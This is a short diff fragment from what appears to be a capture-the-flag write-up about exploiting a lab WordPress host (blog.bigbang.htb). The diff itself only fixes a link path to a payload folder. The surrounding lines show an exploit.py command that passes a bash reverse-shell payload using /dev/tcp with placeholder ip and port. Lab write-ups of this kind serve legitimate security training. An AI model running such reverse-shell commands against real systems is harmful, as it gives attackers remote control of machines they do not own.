@@ -110,7 +110,7 @@ Using **glibc 2.36** , before exploiting the vulnerabilty , we need to download 
 start a listener and build a enviremnent to avoid the collision of dependecies
 
 so after combining the both of payload , the results will be like this :  
-(on this script) [cnext\_payload](payload/cnext_payload/)
+(on this script) [cnext\_payload](/payload/cnext_payload)
 
 ```bash
 $ python3 exploit.py  http://blog.bigbang.htb/wp-admin/admin-ajax.php  'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"'
